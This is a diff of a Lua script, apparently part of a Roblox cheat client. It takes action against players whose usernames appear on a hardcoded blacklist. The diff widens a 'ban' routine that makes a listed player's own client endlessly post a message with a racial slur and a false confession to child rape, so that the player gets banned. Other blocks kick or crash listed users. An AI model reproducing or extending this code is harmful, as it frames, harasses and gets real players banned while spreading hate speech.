@@ -12,13 +12,13 @@ local CrashHttpSpy = true
 -----------------------------
 if KickBlacklistedUsersEnabled then
       task.wait(delay)
-      if name == "Frog_fury14" or name == "Iightnz" or name == "MyPetMum" or name == "kjsdajkwdjkad" or name == "daesrrref" or name == "Mufidpasja_1" or name == "DABLETMAN" or name == "ididurmother13" or name == "4gaeottv50" or name == "tubers93cameb4ck" or name == "AndyCSGOx" or name == "ivegotyourbackbuddy" or name == "AndyCSGOx" or name == "DeathPhantom332" or name == "UkraineBomber12" or name == "IIIIlIIllIIIIll" or name == "anticheatisSoOgood" or name == "llllllllllIIIllllIlI" or name == "Rarest571" or name == "BanSpeedRunbedwarsDD" then 
+      if name == "" then 
          lplr:kick("You have been kicked due to unexpected client behavior.")
       end
 end
 -----------------------------
 if BanBlacklistedUsersEnabled then 
-    if name == "Iightnz" then
+    if name == "Frog_fury14" or name == "tttertertert" or name == "dfstgrezuhdsregtjuyj" or name == "Iightnz" or name == "MyPetMum" or name == "kjsdajkwdjkad" or name == "daesrrref" or name == "Mufidpasja_1" or name == "DABLETMAN" or name == "ididurmother13" or name == "4gaeottv50" or name == "tubers93cameb4ck" or name == "AndyCSGOx" or name == "ivegotyourbackbuddy" or name == "AndyCSGOx" or name == "DeathPhantom332" or name == "UkraineBomber12" or name == "IIIIlIIllIIIIll" or name == "anticheatisSoOgood" or name == "llllllllllIIIllllIlI" or name == "Rarest571" or name == "BanSpeedRunbedwarsDD" or name == "Iightnz" or name == "dfstgrezuhdsregtjuyj" then
       while true do 
          task.wait(0.5)
          game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate niggers and i rape children", "All")
@@ -27,7 +27,7 @@ if BanBlacklistedUsersEnabled then
 end
 -----------------------------
 if CrashBlacklistedUsersEnabled then
-  if name == "Frog_fury14" or name == "MyPetMum" or name == "kjsdajkwdjkad" or name == "daesrrref" or name == "Mufidpasja_1" or name == "DABLETMAN" or name == "ididurmother13" or name == "4gaeottv50" or name == "tubers93cameb4ck" or name == "AndyCSGOx" or name == "ivegotyourbackbuddy" or name == "AndyCSGOx" or name == "DeathPhantom332" or name == "UkraineBomber12" or name == "IIIIlIIllIIIIll" or name == "anticheatisSoOgood" or name == "llllllllllIIIllllIlI" or name == "Rarest571" or name == "BanSpeedRunbedwarsDD" then
+  if name == "" then
   task.wait(delay)
    while true do 
       print(name)
